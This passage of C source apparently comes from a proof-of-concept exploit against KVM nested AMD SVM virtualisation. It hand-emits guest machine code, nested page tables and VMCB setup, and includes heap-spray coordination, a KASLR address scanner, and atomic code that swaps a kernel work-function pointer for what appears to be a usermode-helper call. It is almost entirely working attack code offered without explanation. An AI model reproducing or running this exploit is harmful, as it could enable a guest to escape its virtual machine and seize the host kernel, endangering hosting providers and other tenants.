	*q++ = 0xa3;
	*(uint32_t *)q = G1_MARKER + 48;
	q += 4;
	*q++ = 0xa1;
	*(uint32_t *)q = TARGET_C_BASE + 4;
	q += 4;
	*q++ = 0xa3;
	*(uint32_t *)q = G1_MARKER + 52;
	q += 4;
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = SPRAY_ARM + 10;
	q += 4;
	*q++ = 'R';
	uint8_t *wait_conveyor_z = q;
	*q++ = 0x80;
	*q++ = 0x3d;
	*(uint32_t *)q = SPRAY_ARM + 12;
	q += 4;
	*q++ = 'Z';
	*q++ = 0x74;
	*q++ = 0x04;
	*q++ = 0xf3;
	*q++ = 0x90;
	int8_t wait_conveyor_z_back = (int8_t)(wait_conveyor_z - (q + 2));
	*q++ = 0xeb;
	*q++ = (uint8_t)wait_conveyor_z_back;
	for (int i = 0; i < 3; i++) {
		emit32_store64_imm(&q, NPT_PML4 + (uint32_t)i * 8u, 0);
		if (!i)
			emit32_misaligned_child_zap(&q, NPT_PDPT);
	}
	emit32_store64_imm(&q, NPT_PD + 0, (uint64_t)NPT_PT0 | 0x7);
	emit32_store64_imm(&q, NPT_PD + 8, (uint64_t)NPT_PT_POOL | 0x7);
	emit32_store64_imm(&q, NPT_PD + 16,
			   (uint64_t)(NPT_PT_POOL + 0x1000u) | 0x7);
	emit32_store64_imm(&q, NPT_PAE + 0, (uint64_t)NPT_PD | 0x7);
	for (int i = 1; i < 4; i++)
		emit32_store64_imm(&q, NPT_PAE + (uint32_t)i * 8u, 0);
	emit32_store64_imm(&q, NPT_PT0, (uint64_t)POST_L2_CODE | 0x7);
	emit32_store64_imm(&q, NPT_PT0 + 2u * 8u, (uint64_t)G1_PAE_PDPT | 0x7);
	emit32_vmrun_at(&q, G1_VMCB, NPT_PAE, 0x400);
	emit32_require_vmmcall(&q, G1_VMCB, 'P');
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = SPRAY_ARM + 35;
	q += 4;
	*q++ = 'P';
	uint8_t *wait_conveyor_p_free = q;
	*q++ = 0x80;
	*q++ = 0x3d;
	*(uint32_t *)q = SPRAY_ARM + 36;
	q += 4;
	*q++ = 'p';
	*q++ = 0x74;
	*q++ = 0x04;
	*q++ = 0xf3;
	*q++ = 0x90;
	int8_t wait_conveyor_p_free_back =
		(int8_t)(wait_conveyor_p_free - (q + 2));
	*q++ = 0xeb;
	*q++ = (uint8_t)wait_conveyor_p_free_back;
	for (int i = 0; i < 3; i++) {
		emit32_store64_imm(&q, H_NPT_PML4 + (uint32_t)i * 8u, 0);
		if (!i)
			emit32_misaligned_child_zap(&q, H_NPT_PDPT);
	}
	emit32_store64_imm(&q, H_NPT_PDPT + 0, (uint64_t)H_NPT_PD0 | 0x7);
	emit32_store64_imm(&q, H_NPT_PDPT + 8, (uint64_t)H_NPT_PD1 | 0x7);
	emit32_store64_imm(&q, H_NPT_PDPT + 16, 0);
	emit32_store64_imm(&q, H_NPT_PDPT + 24, 0);
	emit32_store64_imm(&q, H_NPT_PT0, (uint64_t)POST_L2_CODE | 0x7);
	emit32_store64_imm(&q, H_NPT_PT0 + 2u * 8u,
			   (uint64_t)G1_PAE_PDPT | 0x7);
	emit32_vmrun_at(&q, G1_VMCB, H_NPT_PDPT, 0x500);
	emit32_require_vmmcall(&q, G1_VMCB, 'A');
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = SPRAY_ARM + 37;
	q += 4;
	*q++ = 'A';
	emit32_store64_imm(&q, NPT_PD + 0, (uint64_t)NPT_PT0 | 0x7);
	emit32_store64_imm(&q, NPT_PD + 8, (uint64_t)NPT_PT_POOL | 0x7);
	emit32_store64_imm(&q, NPT_PD + 16,
			   (uint64_t)(NPT_PT_POOL + 0x1000u) | 0x7);
	emit32_store64_imm(&q, NPT_PD + 511u * 8u,
			   (uint64_t)(NPT_PT_POOL + (511u - 1u) * 0x1000u) |
				   0x7);
	for (unsigned int pd = 1; pd <= 2; pd++) {
		for (unsigned int i = 0; i < 3; i++) {
			unsigned int k = pd * 512u + i;

			emit32_store64_imm(
				&q, npt_pd_addr(pd) + i * 8u,
				(uint64_t)(NPT_PT_POOL + (k - 1u) * 0x1000u) |
					0x7);
		}
	}
	emit32_store64_imm(&q, NPT_PAE + 0, (uint64_t)NPT_PD | 0x7);
	emit32_store64_imm(&q, NPT_PAE + 8, (uint64_t)npt_pd_addr(1) | 0x7);
	emit32_store64_imm(&q, NPT_PAE + 16, (uint64_t)npt_pd_addr(2) | 0x7);
	emit32_store64_imm(&q, NPT_PAE + 24, 0);
	emit32_store64_imm(&q, NPT_PT0, (uint64_t)POST_L2_CODE | 0x7);
	emit32_store64_imm(&q, NPT_PT0 + 2u * 8u, (uint64_t)G1_PAE_PDPT | 0x7);
	emit32_vmrun_at(&q, G1_VMCB, NPT_PAE, 0x600);
	emit32_require_vmmcall(&q, G1_VMCB, 'B');
	e8(&q, 0xb8);
	e32(&q, 0x80050011u);
	e8(&q, 0x0f);
	e8(&q, 0x22);
	e8(&q, 0xc0);
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = SPRAY_ARM + 38;
	q += 4;
	*q++ = 'B';
	uint8_t *wait_stage2 = q;
	*q++ = 0x80;
	*q++ = 0x3d;
	*(uint32_t *)q = SPRAY_ARM + 13;
	q += 4;
	*q++ = 'F';
	*q++ = 0x74;
	*q++ = 0x04;
	*q++ = 0xf3;
	*q++ = 0x90;
	int8_t wait_stage2_back = (int8_t)(wait_stage2 - (q + 2));
	*q++ = 0xeb;
	*q++ = (uint8_t)wait_stage2_back;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = G1_PAE_PDPT;
	q += 4;
	*(uint32_t *)q = G1_PAE_PD | 0x21;
	q += 4;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = G1_PAE_PDPT + 4;
	q += 4;
	*(uint32_t *)q = 0;
	q += 4;
	emit32_store8_imm(&q, KS_M_READY, 'R');
	*q++ = 0xb8;
	*(uint32_t *)q = G1_HELPER_CODE;
	q += 4;
	*q++ = 0xff;
	*q++ = 0xe0;
	if (q > M + G1_CODE_B + 0x1000u) {
		errno = EOVERFLOW;
		die("phase-B code overflow");
	}
	uint8_t *pc = M + G1_POST_CODE;

	emit_kaslr_post_code(&pc);
	if (pc > M + G1_POST_CODE + 0x1000u) {
		errno = EOVERFLOW;
		die("post code overflow");
	}
	uint8_t *hp = M + G1_HELPER_CODE;

	emit_kaslr_helper_code(&hp);
	if (hp > M + G1_HELPER_CODE + G1_HELPER_CODE_SIZE) {
		errno = EOVERFLOW;
		die("helper code overflow");
	}
	w64(NPT_PML4, NPT_PDPT | 0x7);
	for (unsigned int i = 0; i < 4; i++) {
		w64(NPT_PDPT + i * 8, npt_pd_addr(i) | 0x7);
		w64(NPT_PAE + i * 8, 0);
	}
	for (unsigned int i = 0; i < PHASE_B_PAE_ROOTS; i++)
		w64(NPT_PAE + i * 8, npt_pd_addr(i) | 0x7);
	w64(NPT_PD + 0, NPT_PT0 | 0x7);
	w64(NPT_PT0 + 0 * 8, L2_CODE | 0x7);
	w64(NPT_PT0 + 1 * 8, L2_DATA | 0x7);
	for (int k = 1; k <= NPT_MAP_MAX; k++) {
		uint32_t pt = NPT_PT_POOL + (uint32_t)(k - 1) * 0x1000u;
		uint32_t pd = npt_pd_addr((unsigned int)k / 512u);

		w64(pd + ((unsigned int)k % 512u) * 8, pt | 0x7);
		w64(pt + 0, L2_QUOTA_BK | 0x7);
	}
	w64(POST_NPT_PML4, (uint64_t)POST_NPT_PDPT | 0x7);
	w64(POST_NPT_PDPT, (uint64_t)POST_NPT_PD | 0x7);
	w64(POST_NPT_PD, (uint64_t)POST_NPT_PT | 0x7);
	w64(POST_NPT_PT, (uint64_t)POST_L2_CODE | 0x7);
	w64(POST_NPT_PDPT + 8u, 0x7);
	w64(POST_NPT_PDPT + 16u, 0);
	w64(POST_NPT_PD + 8u, (uint64_t)POST_NPT_PT | 0x7);
	w64(POST_NPT_PD + 16u, 0);
	w64(KASLR_RECYCLE_PD, (uint64_t)POST_NPT_PT | 0x7);
	w64(POST_NPT_PT + 8u, (uint64_t)KASLR_RECYCLE_L2 | 0x7);
	uint8_t *pl = M + POST_L2_CODE;
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x00200000u;
	pl += 4;
	emit_touch_loop(&pl, 2046);
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	pl = M + POST_L2_CODE + 0x100;
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x00200000u;
	pl += 4;
	emit_touch_loop(&pl, 599);
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	pl = M + POST_L2_CODE + 0x200;
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x4b000000u;
	pl += 4;
	emit_touch_loop(&pl, 151);
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	pl = M + POST_L2_CODE + 0x300;
	*pl++ = 0xa1;
	*(uint32_t *)pl = 0x40a00000u;
	pl += 4;
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	pl = M + POST_L2_CODE + 0x380;
	*pl++ = 0xa1;
	*(uint32_t *)pl = 0x200000u;
	pl += 4;
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	pl = M + KASLR_RECYCLE_L2;
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	pl = M + POST_L2_CODE + 0x400;
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x00200000u;
	pl += 4;
	emit_touch_loop(&pl, 43);
	emit32_store64_imm(&pl, 0x2000u, (uint64_t)G1_PAE_PD | 0x1);
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	pl = M + POST_L2_CODE + 0x500;
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x00200000u;
	pl += 4;
	emit_touch_loop(&pl, 510);
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x40000000u;
	pl += 4;
	emit_touch_loop(&pl, 341);
	emit32_store64_imm(&pl, 0x2000u, (uint64_t)G1_PAE_PD | 0x1);
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	pl = M + POST_L2_CODE + 0x600;
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x00200000u;
	pl += 4;
	emit_touch_loop(&pl, 510);
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x40000000u;
	pl += 4;
	emit_touch_loop(&pl, 209);
	*pl++ = 0xbb;
	*(uint32_t *)pl = 0x80000000u;
	pl += 4;
	emit_touch_loop(&pl, 202);
	emit32_store64_imm(&pl, 0x2000u, (uint64_t)G1_PAE_PD | 0x1);
	*pl++ = 0x0f;
	*pl++ = 0x01;
	*pl++ = 0xd9;
	*pl++ = 0xf4;
	w64(H_NPT_PML4, H_NPT_PDPT | 0x7);
	w64(H_NPT_PDPT + 0, H_NPT_PD0 | 0x7);
	w64(H_NPT_PDPT + 8, H_NPT_PD1 | 0x7);
	for (int k = 0; k < H_LEAVES; k++) {
		uint32_t pt = k ? H_NPT_PT_POOL + (uint32_t)(k - 1) * 0x1000u :
				  H_NPT_PT0;
		uint32_t pd = k < 512 ? H_NPT_PD0 : H_NPT_PD1;

		w64(pd + ((unsigned int)k % 512u) * 8, pt | 0x7);
		if (k == 0) {
			w64(pt + 0, H_L2_CODE | 0x7);
			w64(pt + 8, L2_DATA | 0x7);
		} else {
			w64(pt + 0,
			    (k <= DRAIN_LEAVES ? G_L2_CODE : H_L2_QUOTA_BK) |
				    0x7);
		}
	}
	w64(G_NPT_PML4, G_NPT_PDPT | 0x7);
	w64(G_NPT_PDPT, G_NPT_PD | 0x7);
	w64(G_NPT_PD, G_NPT_PT | 0x7);
	w64(G_NPT_PT, G_L2_CODE | 0x7);
	w64(G_NPT_PD + 8, G_NPT_PT | 0x7);
	w64(G_NPT_PDPT + 8, G_NPT_PT1 | 0x7);
	w64(G_NPT_PT1, G_NPT_PT | 0x7);
	for (int i = 0; i < DRAIN_LEAVES; i++)
		w64(G_NPT_PD + (uint32_t)(i + 2) * 8u,
		    (H_NPT_PT_POOL + (uint32_t)i * 0x1000u) | 0x7);
	w64(G_NPT_PT + (((SPRAY_ARM >> 12) & 0x1ffu) * 8), L2_DATA | 0x7);
	uint8_t *gl = M + G_L2_CODE;
	*gl++ = 0xa1;
	*(uint32_t *)gl = 0x200000u;
	gl += 4;
	*gl++ = 0x0f;
	*gl++ = 0x01;
	*gl++ = 0xd9;
	*gl++ = 0xf4;
	gl = M + G_P1_L2_CODE;
	*gl++ = 0x0f;
	*gl++ = 0x01;
	*gl++ = 0xd9;
	*gl++ = 0xf4;
	for (int i = 0; i < S_COUNT; i++) {
		w64(S_NPT_PML4(i), S_NPT_PDPT(i) | 0x7);
		w64(S_NPT_PDPT(i), S_NPT_PD(i) | 0x7);
		w64(S_NPT_PD(i), S_NPT_PT(i) | 0x7);
		w64(S_NPT_PD(i) + 8, S_NPT_PT(i) | 0x7);
		w64(S_NPT_PT(i), S_L2_CODE | 0x7);
	}
	uint8_t *sl = M + S_L2_CODE;
	*sl++ = 0xa1;
	*(uint32_t *)sl = 0x200000u;
	sl += 4;
	*sl++ = 0x0f;
	*sl++ = 0x01;
	*sl++ = 0xd9;
	*sl++ = 0xf4;
	for (int i = 0; i < SHIFT_LEAVES; i++) {
		uint32_t pd = SHIFT_PD_BASE + (uint32_t)i * 0x1000u;

		w64(S_NPT_PDPT(i) + 8, pd | 0x7);
		w64(pd, S_NPT_PT(i) | 0x7);
	}
	uint8_t *hl = M + H_L2_CODE;
	*hl++ = 0xbb;
	*(uint32_t *)hl = 0x00200000u;
	hl += 4;
	emit_touch_loop(&hl, H_INITIAL_LEAVES - 1);
	*hl++ = 0xc6;
	*hl++ = 0x05;
	*(uint32_t *)hl = 0x1805;
	hl += 4;
	*hl++ = 'B';
	*hl++ = 0x0f;
	*hl++ = 0x01;
	*hl++ = 0xd9;
	*hl++ = 0xf4;
	hl = M + H_L2_CODE + 0x400;
	*hl++ = 0xbb;
	*(uint32_t *)hl = (uint32_t)H_INITIAL_LEAVES * 0x200000u;
	hl += 4;
	emit_touch_loop(&hl, H_LEAVES - H_INITIAL_LEAVES);
	*hl++ = 0x0f;
	*hl++ = 0x01;
	*hl++ = 0xd9;
	*hl++ = 0xf4;
	build_l2();
	memset(M + G1_MSRPM, 0, 0x2000);
	memset(M + G1_IOPM, 0xff, 0x3000);
	struct vmcb *v = (struct vmcb *)(M + G1_VMCB);

	memset(v, 0, sizeof(*v));
	v->control.intercepts[INTERCEPT_VMMCALL / 32] |=
		1u << (INTERCEPT_VMMCALL % 32);
	v->control.intercepts[INTERCEPT_VMRUN / 32] |=
		1u << (INTERCEPT_VMRUN % 32);
	v->control.intercepts[INTERCEPT_HLT / 32] |= 1u << (INTERCEPT_HLT % 32);
	v->control.msrpm_base_pa = G1_MSRPM;
	v->control.iopm_base_pa = G1_IOPM;
	v->control.asid = 1;
	v->control.nested_ctl = 1;
	v->control.nested_cr3 = S_NPT_PML4(0);
	uint32_t d = 3 | SVM_S | SVM_P | SVM_DB | SVM_G,
		 c = 11 | SVM_S | SVM_P | SVM_DB | SVM_G;
	set_seg(&v->save.es, d);
	set_seg(&v->save.cs, c);
	set_seg(&v->save.ss, d);
	set_seg(&v->save.ds, d);
	set_seg(&v->save.fs, d);
	set_seg(&v->save.gs, d);
	set_seg(&v->save.tr, d);
	v->save.cpl = 0;
	v->save.efer = EFER_SVME;
	v->save.cr0 = 0x60000011ull;
	v->save.cr4 = 0;
	v->save.cr3 = 0;
	v->save.dr6 = 0xffff0ff0ull;
	v->save.dr7 = 0x400ull;
	v->save.rflags = 2;
	v->save.rip = 0;
	v->save.rsp = 0x1f0000;
	v->save.g_pat = 0x0007040600070406ull;
	memset(M + H_G1_MSRPM, 0, 0x2000);
	memset(M + H_G1_IOPM, 0xff, 0x3000);
	struct vmcb *h = (struct vmcb *)(M + H_G1_VMCB);

	memset(h, 0, sizeof(*h));
	h->control.intercepts[INTERCEPT_VMMCALL / 32] |=
		1u << (INTERCEPT_VMMCALL % 32);
	h->control.intercepts[INTERCEPT_VMRUN / 32] |=
		1u << (INTERCEPT_VMRUN % 32);
	h->control.intercepts[INTERCEPT_HLT / 32] |= 1u << (INTERCEPT_HLT % 32);
	h->control.msrpm_base_pa = H_G1_MSRPM;
	h->control.iopm_base_pa = H_G1_IOPM;
	h->control.asid = 2;
	h->control.nested_ctl = 1;
	h->control.nested_cr3 = G_NPT_PML4;
	set_seg(&h->save.es, d);
	set_seg(&h->save.cs, c);
	set_seg(&h->save.ss, d);
	set_seg(&h->save.ds, d);
	set_seg(&h->save.fs, d);
	set_seg(&h->save.gs, d);
	set_seg(&h->save.tr, d);
	h->save.cpl = 0;
	h->save.efer = EFER_SVME;
	h->save.cr0 = 0x60000011ull;
	h->save.cr4 = 0;
	h->save.cr3 = 0;
	h->save.dr6 = 0xffff0ff0ull;
	h->save.dr7 = 0x400ull;
	h->save.rflags = 2;
	h->save.rip = G_P1_NESTED_RIP;
	h->save.rsp = 0x1e0000;
	h->save.g_pat = 0x0007040600070406ull;
}

struct spray_ctx {
	int vcpu;
	struct kvm_run *run;
};

#define POC_PREFLIGHT_CODE (G1_SPRAY_CODE + 0xd00u)
#define POC_WAKE_CODE (G1_SPRAY_CODE + 0xe00u)
#define POC_WAKE_X2APIC (SPRAY_ARM + 52u)
#define POC_WAKE_SENT (SPRAY_ARM + 53u)
#define POC_WAKE_ACK (SPRAY_ARM + 54u)
#define POC_Q1_SEED_CODE (G1_RELOC_POST_CODE + 0x200u)
#define POC_Q1_ARM_CODE (G1_RELOC_POST_CODE + 0x300u)
#define POC_Q1_WAIT_CODE (G1_RELOC_POST_CODE + 0x400u)
#define POC_Q1_MATCH_CODE (G1_RELOC_POST_CODE + 0x800u)
#define POC_Q1_SENTINEL UINT64_C(0x000ffffffffff001)
#define POC_Q1_REPLACEMENT UINT64_C(0x8000000000000000)
#define POC_Q1_N_GPA (G1_MARKER + 160u)
#define POC_Q1_ARMED (G1_MARKER + 164u)
#define POC_Q1_SEEN (G1_MARKER + 165u)
#define POC_Q1_CLEARED (G1_MARKER + 166u)
#define POC_Q1_FAIL (G1_MARKER + 167u)
#define POC_ACT_ARMED (G1_MARKER + 168u)
#define POC_ACT_DONE (G1_MARKER + 169u)
#define POC_ACT_PREFLIGHT (G1_MARKER + 170u)
#define POC_ACT_FAIL (G1_MARKER + 171u)
#define POC_Q1_MATCHED (G1_MARKER + 172u)
#define POC_ACT_ICR_LOW 0x000c81f1u
#define POC_TERM_PORT_MAIN 0xe0u
#define POC_TERM_PORT_SPRAY 0xe1u
#define POC_PARK_PORT_MAIN 0xe2u
#define POC_PARK_PORT_SPRAY 0xe3u
#define POC_TERM_TOKEN_MAIN 'M'
#define POC_TERM_TOKEN_SPRAY 'S'
#define POC_PARK_TOKEN_MAIN 'm'
#define POC_PARK_TOKEN_SPRAY 's'
#define SMP_BOOT_PAGE 0x0000c000u
#define SMP_AP_BOOT16 (SMP_BOOT_PAGE + 0x000u)
#define SMP_AP_BOOT64 (SMP_BOOT_PAGE + 0x080u)
#define SMP_BSP_BOOT16 (SMP_BOOT_PAGE + 0x100u)
#define SMP_BSP_BOOT64 (SMP_BOOT_PAGE + 0x180u)
#define SMP_SIPI_VECTOR (SMP_BOOT_PAGE >> 12)
#define SMP_RESET_PAGE_GPA UINT64_C(0xfffff000)
#define SMP_RESET_VECTOR_OFF 0xff0u
#define SMP_INIT_SENT (SPRAY_ARM + 55u)
#define SMP_SIPI_SENT (SPRAY_ARM + 56u)
#define SMP_AP_ENTERED (SPRAY_ARM + 57u)
#define RELOC_C_COUNT_GPA (G1_RELOC_TABLE + 0x00u)
#define RELOC_C_LIST_GPA (G1_RELOC_TABLE + 0x20u)
#define RELOC_MAX 480u
#define DYN_C_GPA_SLOT (G1_MARKER + 104u)
#define DYN_PAGE_GPA_SLOT (G1_MARKER + 108u)
#define DYN_SCAN_COUNT_SLOT (G1_MARKER + 112u)
#define DYN_C_APPLIED_SLOT (G1_MARKER + 116u)
#define DYN_RELOC_STATUS (SPRAY_ARM + 27u)
#define KASLR_ARENA_HI_MIN 0xffff8880u
#define KASLR_ARENA_HI_END 0xfffffe00u
#define MMU_HEADER_SIZE 0xb8u
#define MMU_HEADERS_PER_SLAB 22u
_Static_assert(0xffff9eacu >= KASLR_ARENA_HI_MIN &&
		       0xffff9eacu < KASLR_ARENA_HI_END,
	       "recorded memory-KASLR direct-map base must pass scanner");
_Static_assert(0xffff8000u < KASLR_ARENA_HI_MIN &&
		       0xffffffffu >= KASLR_ARENA_HI_END,
	       "guard-hole and kernel-image addresses must fail scanner");
_Static_assert(POC_Q1_MATCH_CODE + 0x100u <= G1_RELOC_POST_CODE + 0x1000u,
	       "POC Q1 code exceeds relocation-post reserve");
_Static_assert(POC_Q1_FAIL < G1_HSAVE,
	       "POC Q1 observations exceed marker-page tail");
_Static_assert(POC_ACT_CODE + POC_ACT_SIZE <= G1_RELOC_WAIT_CODE + 0x1000u,
	       "POC activation code exceeds relocation-wait reserve");
_Static_assert(POC_MONITOR_RETURNED < G1_HSAVE,
	       "POC activation observations exceed marker-page tail");
_Static_assert(SMP_BOOT_PAGE + 0x1000u <= G1_PAE_PD,
	       "SMP bootstrap page overlaps the PAE page directory");
_Static_assert(SMP_SIPI_VECTOR <= 0xffu,
	       "SMP AP bootstrap is not representable by a SIPI vector");
static uint32_t expected_c_relocs;
static void emit64_store8_abs(uint8_t **pp, uint32_t addr, uint8_t value)
{
	uint8_t *p = *pp;

	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, addr);
	e8(&p, value);
	*pp = p;
}

static void emit64_atomic_rescue_work_func(uint8_t **pp, uint8_t **bad,
					   unsigned int *nbad)
{
	uint8_t *p = *pp;

	e8(&p, 0x8b);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_UMH_LO);
	e8(&p, 0x8b);
	e8(&p, 0x14);
	e8(&p, 0x25);
	e32(&p, KS_UMH_HI);
	e8(&p, 0x8b);
	e8(&p, 0x1c);
	e8(&p, 0x25);
	e32(&p, KS_WORK_NOOP_LO);
	e8(&p, 0x8b);
	e8(&p, 0x0c);
	e8(&p, 0x25);
	e32(&p, KS_WORK_NOOP_HI);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x8f);
	e32(&p, KHP_W + 24u);
	uint8_t *installed = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x3b);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_WORK_NOOP_LO);
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x3b);
	e8(&p, 0x14);
	e8(&p, 0x25);
	e32(&p, KS_WORK_NOOP_HI);
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	patch_rel32(installed, p);
	*pp = p;
}

static void emit64_atomic_release_completion(uint8_t **pp, uint8_t owner,
					     uint8_t **bad, unsigned int *nbad)
{
	uint8_t *p = *pp;
	uint8_t *retry = p;

	e8(&p, 0x8b);
	e8(&p, 0x87);
	e32(&p, KHP_COMPLETE + 4u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *already_owned = emit_rel32_jcc(&p, 0x85);

	e8(&p, 0x8b);
	e8(&p, 0x97);
	e32(&p, KHP_COMPLETE + 8u);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, 1u);
	uint8_t *plain_locked = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, 0x101u);
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	patch_rel32(plain_locked, p);
	e8(&p, 0xbb);
	e32(&p, owner);
	e8(&p, 0x89);
	e8(&p, 0xd1);
	e8(&p, 0x81);
	e8(&p, 0xe1);
	e32(&p, 0xffffff00u);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x8f);
	e32(&p, KHP_COMPLETE + 4u);
	uint8_t *installed = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *lock_raced = emit_rel32_jcc(&p, 0x84);
	uint8_t *owner_check = p;

	e8(&p, 0x3d);
	e32(&p, 'A');
	uint8_t *accepted_a = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0x3d);
	e32(&p, 'B');
	bad[(*nbad)++] = emit_rel32_jcc(&p, 0x85);
	uint8_t *accepted = p;

	patch_rel32(already_owned, owner_check);
	patch_rel32(installed, accepted);
	patch_rel32(lock_raced, retry);
	patch_rel32(accepted_a, accepted);
	*pp = p;
}

static void emit_smp_boot16(uint32_t entry16, uint32_t entry64)
{
	uint8_t *p = M + entry16;

	e8(&p, 0xfa);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x8e);
	e8(&p, 0xd8);
	e8(&p, 0x8e);
	e8(&p, 0xc0);
	e8(&p, 0x8e);
	e8(&p, 0xd0);
	e8(&p, 0xbc);
	e8(&p, 0x00);
	e8(&p, 0xb0);
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0x16);
	e8(&p, (uint8_t)G1_GDTR);
	e8(&p, (uint8_t)(G1_GDTR >> 8));
	e8(&p, 0x66);
	e8(&p, 0xb8);
	e32(&p, 0x20u);
	e8(&p, 0x0f);
	e8(&p, 0x22);
	e8(&p, 0xe0);
	e8(&p, 0x66);
	e8(&p, 0xb8);
	e32(&p, G1_PML4);
	e8(&p, 0x0f);
	e8(&p, 0x22);
	e8(&p, 0xd8);
	e8(&p, 0x66);
	e8(&p, 0xb9);
	e32(&p, 0xc0000080u);
	e8(&p, 0x66);
	e8(&p, 0xb8);
	e32(&p, EFER_LME | EFER_SVME);
	e8(&p, 0x66);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0x0f);
	e8(&p, 0x30);
	e8(&p, 0x66);
	e8(&p, 0xb8);
	e32(&p, 0x80010033u);
	e8(&p, 0x0f);
	e8(&p, 0x22);
	e8(&p, 0xc0);
	e8(&p, 0x66);
	e8(&p, 0xea);
	e32(&p, entry64);
	e8(&p, 0x08);
	e8(&p, 0x00);
	if (p > M + entry16 + 0x80u) {
		errno = EOVERFLOW;
		die("SMP boot16");
	}
}

static void emit_smp_boot64(uint32_t entry64, uint32_t target, uint64_t stack,
			    uint32_t hsave, bool ap)
{
	uint8_t *p = M + entry64;
	uint8_t *jump;

	e8(&p, 0x66);
	e8(&p, 0xb8);
	e8(&p, 0x18);
	e8(&p, 0x00);
	e8(&p, 0x8e);
	e8(&p, 0xd8);
	e8(&p, 0x8e);
	e8(&p, 0xc0);
	e8(&p, 0x8e);
	e8(&p, 0xd0);
	e8(&p, 0x8e);
	e8(&p, 0xe0);
	e8(&p, 0x8e);
	e8(&p, 0xe8);
	e8(&p, 0x48);
	e8(&p, 0xbc);
	e64(&p, stack);
	e8(&p, 0xb9);
	e32(&p, MSR_VM_HSAVE_PA);
	e8(&p, 0xb8);
	e32(&p, hsave);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0x0f);
	e8(&p, 0x30);
	if (ap) {
		emit64_store8_abs(&p, SMP_AP_ENTERED, 'A');
		emit64_store8_abs(&p, POC_WAKE_ACK, 'W');
	}
	jump = emit_rel32_jmp(&p);
	patch_rel32(jump, M + target);
	if (p > M + entry64 + 0x80u) {
		errno = EOVERFLOW;
		die("SMP boot64");
	}
}

static void emit_smp_guest_bootstraps(void)
{
	memset(M + SMP_BOOT_PAGE, 0, 0x1000u);
	emit_smp_boot16(SMP_AP_BOOT16, SMP_AP_BOOT64);
	emit_smp_boot64(SMP_AP_BOOT64, G1_CODE_A, 0xf000u, G1_HSAVE, true);
	emit_smp_boot16(SMP_BSP_BOOT16, SMP_BSP_BOOT64);
	emit_smp_boot64(SMP_BSP_BOOT64, G1_SPRAY_CODE, 0xe000u, H_G1_HSAVE,
			false);
}

static uint8_t *find_prefault_ready_store(void)
{
	uint8_t pattern[8] = { 0xc6, 0x04, 0x25, 0, 0, 0, 0, 'Y' };
	uint8_t *found = NULL;
	*(uint32_t *)(pattern + 3) = SPRAY_ARM + 4u;
	for (uint8_t *p = M + G1_SPRAY_CODE;
	     p + sizeof(pattern) <= M + G1_SPRAY_CODE + 0x1000u; p++) {
		if (memcmp(p, pattern, sizeof(pattern)))
			continue;
		if (found) {
			errno = EEXIST;
			die("POC prefault-ready ambiguity");
		}
		found = p;
	}
	if (!found) {
		errno = ENOENT;
		die("POC prefault-ready store");
	}
	return found;
}

static uint8_t *find_unique_bytes(uint8_t *begin, uint8_t *end,
				  const uint8_t *pattern, size_t length,
				  const char *what)
{
	uint8_t *found = NULL;

	for (uint8_t *p = begin; p + length <= end; p++) {
		if (memcmp(p, pattern, length))
			continue;
		if (found) {
			errno = EEXIST;
			die(what);
		}
		found = p;
	}
	if (!found) {
		errno = ENOENT;
		die(what);
	}
	return found;
}

static void emit_poc_guest_wake(void)
{
	uint8_t *entry = M + G1_SPRAY_CODE;
	uint8_t *hook = find_prefault_ready_store();
	uint8_t entry_saved[5], ready_saved[8];
	uint8_t *p;
	uint8_t *has_x2apic, *apic_enabled, *resume;
